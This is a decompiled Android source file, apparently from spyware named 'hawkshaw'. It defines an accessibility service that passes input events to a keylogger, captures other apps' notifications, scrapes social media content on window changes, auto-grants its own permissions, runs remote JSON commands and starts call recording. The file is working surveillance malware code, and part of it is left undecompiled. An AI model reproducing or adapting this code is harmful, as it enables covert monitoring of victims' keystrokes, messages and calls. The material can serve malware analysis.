package com.hawkshaw.library.features.accessibility;

import F3.b;
import Y1.K;
import android.accessibilityservice.AccessibilityService;
import android.app.Notification;
import android.content.Intent;
import android.os.Parcelable;
import android.view.accessibility.AccessibilityEvent;
import com.hawkshaw.library.HawkshawInitializer;
import com.hawkshaw.library.datalayer.models.Command;
import com.hawkshaw.library.datalayer.network.twirp.interceptors.ContentNegotiationInterceptorKt;
import com.hawkshaw.library.features.accessibility.socialmedia.HandlerKt;
import com.hawkshaw.library.features.media.MediaService;
import com.hawkshaw.library.logger.Logger;
import j3.f;
import java.util.concurrent.atomic.AtomicReferenceFieldUpdater;
import m.C0711b;
import w3.z;
import x3.C1084c;

public final class MainAccessibilityService extends AccessibilityService {
    public static final Companion Companion = new Companion((f) null);
    public static final String TAG = "MainAccessibilityService";

    public static final class Companion {
        private Companion() {
        }

        public /* synthetic */ Companion(f fVar) {
            this();
        }
    }

    public /* synthetic */ class WhenMappings {
        public static final /* synthetic */ int[] $EnumSwitchMapping$0;

        /* JADX WARNING: Failed to process nested try/catch */
        /* JADX WARNING: Missing exception handler attribute for start block: B:3:0x0010 */
        static {
            
                com.hawkshaw.library.HawkshawInitializer$Step[] r0 = com.hawkshaw.library.HawkshawInitializer.Step.values()
                int r0 = r0.length
                int[] r0 = new int[r0]
                com.hawkshaw.library.HawkshawInitializer$Step r1 = com.hawkshaw.library.HawkshawInitializer.Step.UNKNOWN     // Catch:{ NoSuchFieldError -> 0x0010 }
                int r1 = r1.ordinal()     // Catch:{ NoSuchFieldError -> 0x0010 }
                r2 = 1
                r0[r1] = r2     // Catch:{ NoSuchFieldError -> 0x0010 }
            L_0x0010:
                com.hawkshaw.library.HawkshawInitializer$Step r1 = com.hawkshaw.library.HawkshawInitializer.Step.REQUESTING_PERMISSIONS     // Catch:{ NoSuchFieldError -> 0x0019 }
                int r1 = r1.ordinal()     // Catch:{ NoSuchFieldError -> 0x0019 }
                r2 = 2
                r0[r1] = r2     // Catch:{ NoSuchFieldError -> 0x0019 }
            L_0x0019:
                $EnumSwitchMapping$0 = r0
                return
            
            throw new UnsupportedOperationException("Method not decompiled: com.hawkshaw.library.features.accessibility.MainAccessibilityService.WhenMappings.<clinit>():void");
        }
    }

    private final void filterByEventType(AccessibilityEvent accessibilityEvent) {
        String str = null;
        Integer valueOf = accessibilityEvent != null ? Integer.valueOf(accessibilityEvent.getEventType()) : null;
        if ((valueOf != null && valueOf.intValue() == 16) || ((valueOf != null && valueOf.intValue() == 8) || (valueOf != null && valueOf.intValue() == 1))) {
            KeyloggerEventKt.handleKeyloggerEventAsync(accessibilityEvent);
        } else if (valueOf != null && valueOf.intValue() == 32) {
            onWindowChanged(accessibilityEvent, false);
        } else if (valueOf != null && valueOf.intValue() == 2048) {
            onWindowChanged(accessibilityEvent, true);
        } else if (valueOf != null && valueOf.intValue() == 64) {
            CharSequence packageName = accessibilityEvent.getPackageName();
            if (packageName != null) {
                str = packageName.toString();
            }
            if (!K.f(str, getPackageName())) {
                Parcelable parcelableData = accessibilityEvent.getParcelableData();
                if (parcelableData instanceof Notification) {
                    CharSequence packageName2 = accessibilityEvent.getPackageName();
                    K.m(packageName2, "getPackageName(...)");
                    NotificationKt.handleNotificationAsync((Notification) parcelableData, packageName2);
                }
            }
        }
    }

    private final void onWindowChanged(AccessibilityEvent accessibilityEvent, boolean z4) {
        if (shouldLaunchPermissionManager()) {
            PermissionManagerKt.grantPermissions(this, accessibilityEvent);
        }
        HandlerKt.extractSocialMedia(accessibilityEvent);
    }

    private final boolean shouldLaunchPermissionManager() {
        HawkshawInitializer.Companion companion = HawkshawInitializer.Companion;
        z zVar = (z) companion.getActivityStep$library_release();
        zVar.getClass();
        C0711b bVar = C1084c.f9844b;
        AtomicReferenceFieldUpdater atomicReferenceFieldUpdater = z.f9782H;
        Object obj = atomicReferenceFieldUpdater.get(zVar);
        HawkshawInitializer.State state = null;
        if (obj == bVar) {
            obj = null;
        }
        int i5 = WhenMappings.$EnumSwitchMapping$0[((HawkshawInitializer.Step) obj).ordinal()];
        if (i5 == 1) {
            return false;
        }
        if (i5 == 2) {
            z zVar2 = (z) companion.getActivityState$library_release();
            zVar2.getClass();
            Object obj2 = atomicReferenceFieldUpdater.get(zVar2);
            if (obj2 != bVar) {
                state = obj2;
            }
            return state.isAtLeast(HawkshawInitializer.State.STARTED);
        }
        throw new RuntimeException();
    }

    public void onAccessibilityEvent(AccessibilityEvent accessibilityEvent) {
        try {
            filterByEventType(accessibilityEvent);
        } catch (Exception e5) {
            Logger.e$default(Logger.INSTANCE, TAG, "OnAccessibilityEvent: ".concat(K.v0(e5)), (Exception) null, false, 12, (Object) null);
        }
    }

    public void onDestroy() {
        super.onDestroy();
        Logger.v$default(Logger.INSTANCE, TAG, "OnDestroy", false, 4, (Object) null);
    }

    public void onInterrupt() {
        Logger.v$default(Logger.INSTANCE, TAG, "OnInterrupt", false, 4, (Object) null);
    }

    public void onServiceConnected() {
        super.onServiceConnected();
        Logger.v$default(Logger.INSTANCE, TAG, "OnServiceConnected", false, 4, (Object) null);
    }

    public int onStartCommand(Intent intent, int i5, int i6) {
        String stringExtra;
        if (!(intent == null || (stringExtra = intent.getStringExtra("command")) == null)) {
            b json = ContentNegotiationInterceptorKt.getJson();
            json.getClass();
            GlobalActionKt.handleCommand(this, (Command.AccessibilityCommandRequest) json.a(Command.AccessibilityCommandRequest.Companion.serializer(), stringExtra));
        }
        if (intent != null && intent.getBooleanExtra("call_recorder", false)) {
            MediaService.Companion.handleCallRecorderRequest$library_release(intent);
        }
        return super.onStartCommand(intent, i5, i6);
    }
}
